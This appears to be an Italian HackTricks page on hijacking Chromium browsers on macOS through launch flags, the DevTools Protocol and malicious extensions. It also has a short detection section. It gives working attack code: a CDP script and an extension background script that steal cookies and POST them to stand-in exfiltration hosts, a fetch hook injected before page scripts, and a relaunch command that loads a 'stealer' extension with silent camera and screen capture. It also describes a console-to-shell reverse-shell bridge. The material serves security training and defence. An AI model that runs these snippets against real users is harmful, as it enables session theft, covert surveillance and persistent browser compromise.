# macOS Chromium Injection

{{#include ../../../banners/hacktricks-training.md}}

## Informazioni di base

I browser basati su Chromium, come Google Chrome, Microsoft Edge, Brave, Arc, Vivaldi e Opera, utilizzano tutti gli stessi switch da riga di comando, file delle preferenze e interfacce di automazione DevTools. Su macOS, qualsiasi utente con accesso alla GUI può terminare una sessione del browser esistente e riaprirla con flag, estensioni o endpoint DevTools arbitrari, che vengono eseguiti con gli entitlements dell'utente target.

#### Avvio di Chromium con flag personalizzati su macOS

macOS mantiene una singola istanza UI per ogni profilo Chromium, quindi la strumentazione normalmente richiede la chiusura forzata del browser (ad esempio con `osascript -e 'tell application "Google Chrome" to quit'`). Gli attaccanti in genere lo riavviano tramite `open -na "Google Chrome" --args <flags>`, così possono iniettare argomenti senza modificare l'app bundle. Inserire questo comando in un LaunchAgent dell'utente (`~/Library/LaunchAgents/*.plist`) o in un login hook garantisce che il browser manomesso venga riavviato dopo un reboot o un logoff.

#### Flag `--load-extension`

Il flag `--load-extension` carica automaticamente estensioni non impacchettate (con percorsi separati da virgole). Usarlo insieme a `--disable-extensions-except` per bloccare le estensioni legittime e forzare l'esecuzione esclusiva del proprio payload. Le estensioni malevole possono richiedere permission ad alto impatto come `debugger`, `webRequest` e `cookies` per accedere ai protocolli DevTools, modificare gli header CSP, eseguire un downgrade di HTTPS o esfiltrare materiale di sessione non appena il browser viene avviato.

#### Flag `--remote-debugging-port` / `--remote-debugging-pipe`

Questi switch espongono il Chrome DevTools Protocol (CDP) tramite TCP o pipe, consentendo a strumenti esterni di controllare il browser. Google ha osservato un abuso diffuso di questa interfaccia da parte degli infostealer e, a partire da Chrome 136 (marzo 2025), gli switch vengono ignorati per il profilo predefinito, a meno che il browser non venga avviato con un `--user-data-dir` non standard. Questo applica App-Bound Encryption ai profili reali, ma gli attaccanti possono comunque creare un nuovo profilo, indurre la vittima ad autenticarsi al suo interno (con phishing/triage assistance) e raccogliere cookie, token, stati di device trust o registrazioni WebAuthn tramite CDP.<sup>[5]</sup>

#### Flag `--user-data-dir`

Questo flag reindirizza l'intero profilo del browser (History, Cookies, Login Data, file delle preferenze, ecc.) verso un percorso controllato dall'attaccante. È obbligatorio quando si combinano le build moderne di Chrome con `--remote-debugging-port` e mantiene inoltre isolato il profilo manomesso, consentendo di inserire file `Preferences` o `Secure Preferences` preconfigurati che disabilitano gli avvisi di sicurezza, installano automaticamente estensioni e modificano gli schemi predefiniti.

#### Flag `--use-fake-ui-for-media-stream`

Questo switch bypassa la richiesta di permission per la fotocamera e il microfono, permettendo a qualsiasi pagina che chiama `getUserMedia` di ottenere immediatamente l'accesso. Usarlo insieme a flag come `--auto-select-desktop-capture-source="Entire Screen"`, `--kiosk` o ai comandi CDP `Browser.grantPermissions` per acquisire silenziosamente audio/video, condividere il desktop o soddisfare i controlli delle permission WebRTC senza interazione dell'utente.

## Pattern di Delivery e Relaunch osservati in natura

L'abuso di CDP è comunemente una fase di **post-exploitation**, piuttosto che il payload iniziale. Una recente campagna macOS mirata agli sviluppatori ha utilizzato una fase di build **`Run Script`** di Xcode avvelenata (`PBXShellScriptBuildPhase`), in modo che il codice venisse eseguito solo quando la vittima effettuava il **build** del progetto, non quando si limitava a clonarlo o ad aprirlo. Dopo la prima esecuzione, il malware ha infettato anche altri alberi `.xcodeproj`, aggiunto hook Git `pre-commit` malevoli e cercato altri progetti Xcode negli archivi ZIP.<sup>[3]</sup>

Per l'abuso di Chromium questo è importante perché l'attaccante non deve applicare patch al browser binary. Un breve stager di build-phase / `osascript` può invece installare un **browser wrapper** (LaunchAgent, login item, voce del Dock, app launcher trojanizzato, ecc.) che riapre il browser legittimo con flag controllati dall'attaccante ogni volta che l'utente lo avvia.<sup>[3]</sup>

> [!TIP]
> Sugli endpoint degli sviluppatori, esaminare i file `.pbxproj`, `.git/hooks/pre-commit` e gli ZIP contenenti `.xcodeproj` alla ricerca di `curl`, `osascript`, `xxd`, `base64` annidati o logica di relaunch di Chrome inattesi.

## Abuso del Remote Debugging e del DevTools Protocol

Una volta riavviato Chrome con un `--user-data-dir` dedicato e `--remote-debugging-port`, è possibile collegarsi tramite CDP (ad esempio usando `chrome-remote-interface`, `puppeteer` o `playwright`) e automatizzare workflow con privilegi elevati:

- **Furto di cookie/sessioni:** `Network.getAllCookies` e `Storage.getCookies` restituiscono anche valori HttpOnly quando la App-Bound encryption normalmente impedirebbe l'accesso al filesystem, perché CDP chiede al browser in esecuzione di decrittografarli.
- **Manomissione delle permission:** `Browser.grantPermissions` e `Emulation.setGeolocationOverride` consentono di bypassare le richieste di accesso a fotocamera e microfono (soprattutto se combinati con `--use-fake-ui-for-media-stream`) o di falsificare i controlli di sicurezza basati sulla posizione.
- **Iniezione di keystroke/script:** `Runtime.evaluate` esegue JavaScript arbitrario nella tab attiva, consentendo di sottrarre credenziali, modificare il DOM o iniettare beacon di persistenza che sopravvivono alla navigazione.<sup>[1]</sup>
- **Esfiltrazione live:** `Network.webRequestWillBeSentExtraInfo` e `Fetch.enable` intercettano richieste e risposte autenticate in tempo reale senza toccare gli artefatti sul disco.
```javascript
import CDP from 'chrome-remote-interface';

(async () => {
const client = await CDP({host: '127.0.0.1', port: 9222});
const {Network, Runtime} = client;
await Network.enable();
const {cookies} = await Network.getAllCookies();
console.log(cookies.map(c => `${c.domain}:${c.name}`));
await Runtime.evaluate({expression: "fetch('https://xfil.local', {method:'POST', body:document.cookie})"});
await client.close();
})();
```
Poiché Chrome 136 blocca CDP sul profilo predefinito, copiare la directory `~/Library/Application Support/Google/Chrome` esistente della vittima in un percorso di staging non consente più di ottenere cookie decrittografati. È invece possibile indurre l'utente ad autenticarsi all'interno del profilo strumentato (ad esempio, tramite una sessione di supporto "utile") oppure catturare i token MFA in transito tramite network hook controllati da CDP.<sup>[5]</sup>

### Catena di CDP Backdoor in stile XCSSET

Un pattern malware pratico consiste nel:

1. Riavviare l'implant o wrapper userland ogni volta che Chrome viene avviato.
2. Avviare il browser legittimo con `--remote-debugging-port=<port>` e, su Chrome 136+, generalmente con un `--user-data-dir=<dir>` associato e non predefinito.
3. Avviare un helper che si connette al WebSocket CDP locale e registra un pre-document hook con `Page.addScriptToEvaluateOnNewDocument`.<sup>[2]</sup>

Questo helper può iniettare JavaScript **prima** dell'esecuzione del codice del sito, caratteristica ideale per eseguire hooking di `window.fetch`, `XMLHttpRequest`, wallet provider o flussi di autofill senza modificare i file sul disco.<sup>[3]</sup>
```javascript
await Page.enable();
await Runtime.enable();
await Page.addScriptToEvaluateOnNewDocument({
source: `
const oldFetch = window.fetch;
window.fetch = async (...args) => {
console.log('__HT__' + JSON.stringify(args[0]));
return oldFetch(...args);
};
`
});
Runtime.consoleAPICalled(({args}) => { /* helper parses __HT__ */ });
```
Una variante più potente trasforma il browser in un **host command bridge**: il JavaScript iniettato emette un `console.log` con un delimitatore, l'helper locale monitora `Runtime.consoleAPICalled`, rimuove il marker, esegue il contenuto rimanente tramite la shell dell'host (ad esempio `exec.Command` di Go) e restituisce stdout/stderr tramite il WebSocket dell'attaccante. Questo trasforma l'esecuzione di script a livello di tab in una reverse shell per lo più fileless.<sup>[3]</sup>

## Injection basata su Extension tramite Debugger API

La ricerca del 2023 "Chrowned by an Extension" ha dimostrato che una extension malevola che utilizza l'API `chrome.debugger` può collegarsi a qualsiasi tab e ottenere gli stessi poteri di DevTools di `--remote-debugging-port`.<sup>[6]</sup> Questo infrange le ipotesi originali sull'isolamento (le extension rimangono nel proprio contesto) e consente:

- Furto silenzioso di cookie e credenziali tramite `Network.getAllCookies`/`Fetch.getResponseBody`.
- Modifica delle autorizzazioni dei siti (camera, microfono, geolocalizzazione) e bypass degli interstitial di sicurezza, consentendo alle pagine di phishing di impersonare i dialoghi di Chrome.
- Manomissione on-path degli avvisi TLS, dei download o dei prompt WebAuthn tramite il controllo programmatico di `Page.handleJavaScriptDialog`, `Page.setDownloadBehavior` o `Security.handleCertificateError`.

Carica la extension con `--load-extension`/`--disable-extensions-except`, così non è richiesta alcuna interazione dell'utente. Un background script minimale che weaponizza l'API è il seguente:
```javascript
chrome.tabs.onUpdated.addListener((tabId, info) => {
if (info.status !== 'complete') return;
chrome.debugger.attach({tabId}, '1.3', () => {
chrome.debugger.sendCommand({tabId}, 'Network.enable');
chrome.debugger.sendCommand({tabId}, 'Network.getAllCookies', {}, (res) => {
fetch('https://exfil.local/dump', {method: 'POST', body: JSON.stringify(res.cookies)});
});
});
});
```
L'estensione può anche sottoscrivere gli eventi `Debugger.paused` per leggere le variabili JavaScript, modificare gli script inline o aggiungere breakpoint personalizzati che persistono durante la navigazione. Poiché tutto viene eseguito all'interno della sessione GUI dell'utente, Gatekeeper e TCC non vengono attivati, rendendo questa tecnica ideale per malware che ha già ottenuto l'esecuzione nel contesto dell'utente.<sup>[6]</sup>

## Rilevamento e Hunting

- Generare un alert quando i browser Chromium vengono avviati con `--remote-debugging-port`, `--remote-debugging-pipe` o un `--user-data-dir` sospetto, soprattutto quando il processo padre è `bash`, `sh`, `osascript`, `xcodebuild` o un helper LaunchAgent.
- Cercare catene brevi in cui un helper apre un WebSocket CDP locale, registra `Page.addScriptToEvaluateOnNewDocument` e quindi stabilisce una connessione WebSocket/HTTPS outbound di lunga durata.
- Cercare bridge console-to-shell correlando l'attività del browser `Runtime.consoleAPICalled` con shell figlie o processi helper che eseguono comandi forniti dall'attacker.
- Sui Mac degli sviluppatori, esaminare le voci `PBXShellScriptBuildPhase` nei file `.pbxproj`, gli hook Git `pre-commit`, i relauncher del Dock/login item e i progetti Xcode contenuti in ZIP alla ricerca dell'installazione di browser wrapper.
```bash
ps auxww | rg 'Chrome|Brave|Edge.*(--remote-debugging-port|--remote-debugging-pipe|--user-data-dir)'
lsof -nP -iTCP -sTCP:LISTEN | rg 'Chrome|Brave|Edge'
find ~/Library/LaunchAgents /Library/LaunchAgents -name '*.plist' -exec plutil -p {} \; 2>/dev/null | rg 'remote-debugging|Google Chrome|Brave|Edge'
rg -n 'PBXShellScriptBuildPhase|curl|osascript|xxd|base64' ~/Code --glob '*.pbxproj'
```
### Strumenti

- [https://github.com/breakpointHQ/snoop](https://github.com/breakpointHQ/snoop) - Automatizza l'avvio di Chromium con payload extensions ed espone interactive CDP hooks.
- [https://github.com/breakpointHQ/VOODOO](https://github.com/breakpointHQ/VOODOO) - Tool simile, focalizzato sull'intercettazione del traffico e sulla browser instrumentation per operatori macOS.
- [https://github.com/cyrus-and/chrome-remote-interface](https://github.com/cyrus-and/chrome-remote-interface) - Libreria Node.js per eseguire script sui dump del Chrome DevTools Protocol (cookie, DOM, permessi) quando un'istanza `--remote-debugging-port` è attiva.

### Esempio
```bash
# Launch an instrumented Chrome profile listening on CDP and auto-granting media/capture access
osascript -e 'tell application "Google Chrome" to quit'
open -na "Google Chrome" --args \
--user-data-dir="$TMPDIR/chrome-privesc" \
--remote-debugging-port=9222 \
--load-extension="$PWD/stealer" \
--disable-extensions-except="$PWD/stealer" \
--use-fake-ui-for-media-stream \
--auto-select-desktop-capture-source="Entire Screen"

# Intercept traffic
voodoo intercept -b chrome
```
Trova altri esempi nei link degli strumenti.

## Riferimenti

- [1] [Chrome DevTools Protocol - dominio Runtime](https://chromedevtools.github.io/devtools-protocol/v8/Runtime/)
- [2] [Chrome DevTools Protocol - dominio Page](https://chromedevtools.github.io/devtools-protocol/tot/Page/)
- [3] [The Xcode Assassin Returns: Un'analisi approfondita dell'ultima versione di XCSSET - Unit 42](https://unit42.paloaltonetworks.com/xcsset-v40-malware-analysis/)
- [4] [Ron Masas (@RonMasas) su X](https://twitter.com/RonMasas/status/1758106347222995007)
- [5] [Modifiche agli switch di remote debugging per migliorare la sicurezza - Chrome for Developers](https://developer.chrome.com/blog/remote-debugging-port)
- [6] [Chrowned by an Extension: Abusing the Chrome DevTools Protocol through the Debugger API (arXiv:2305.11506)](https://arxiv.org/abs/2305.11506)

{{#include ../../../banners/hacktricks-training.md}}
